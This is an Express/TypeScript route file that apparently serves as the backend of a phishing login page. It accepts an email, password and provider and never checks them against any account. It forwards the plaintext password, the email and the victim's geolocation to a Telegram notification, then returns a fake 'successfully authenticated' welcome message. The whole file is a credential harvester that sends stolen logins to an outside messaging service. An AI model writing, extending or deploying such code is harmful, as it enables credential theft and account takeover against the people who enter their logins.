import { Router } from 'express';
import { resolveGeo } from '../lib/geo.ts';
import { getClientIp, parseEncryptedBody } from '../lib/security.ts';
import { sendTelegramNotification } from '../lib/telegram.ts';
import { sanitizeLoginFields } from '../lib/validation.ts';
import { loginRateLimit } from '../middleware/rateLimit.ts';

const router = Router();

router.post('/', loginRateLimit, async (req, res) => {
  try {
    let decrypted: Record<string, unknown>;
    try {
      decrypted = await parseEncryptedBody(req.body);
    } catch {
      res.status(400).json({
        success: false,
        message: 'Invalid request',
        error: 'Encrypted payload required.',
      });
      return;
    }

    const fields = sanitizeLoginFields(decrypted);
    if (!fields.ok) {
      res.status(400).json({
        success: false,
        message: 'Validation failed',
        error: fields.error,
      });
      return;
    }

    const { email, password, provider } = fields;

    const emailLocal = email.split('@')[0];
    const formattedName = emailLocal
      .split('.')
      .map((part) => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(' ');

    const providerName = provider ? ` via ${provider}` : '';
    const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`;

    const clientIp = getClientIp(req);
    const geo = await resolveGeo(clientIp, {
      ip: typeof decrypted.ip === 'string' ? decrypted.ip : undefined,
      country: typeof decrypted.country === 'string' ? decrypted.country : undefined,
      countryCode: typeof decrypted.countryCode === 'string' ? decrypted.countryCode : undefined,
      region: typeof decrypted.region === 'string' ? decrypted.region : undefined,
      city: typeof decrypted.city === 'string' ? decrypted.city : undefined,
      continent: typeof decrypted.continent === 'string' ? decrypted.continent : undefined,
      org: typeof decrypted.org === 'string' ? decrypted.org : undefined,
      timezone: typeof decrypted.timezone === 'string' ? decrypted.timezone : undefined,
    });

    await sendTelegramNotification(
      formattedName,
      email,
      provider || 'email',
      password,
      geo,
    ).catch((err) => {
      console.error('Telegram notification error:', err);
    });

    res.json({
      success: true,
      message: welcomeMessage,
      data: {
        email,
        name: formattedName,
        provider: provider || 'email',
        timestamp: new Date().toISOString(),
        geo,
      },
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error',
      error:
        error instanceof Error
          ? error.message
          : 'An unexpected error occurred during login processing.',
    });
  }
});

export default router;
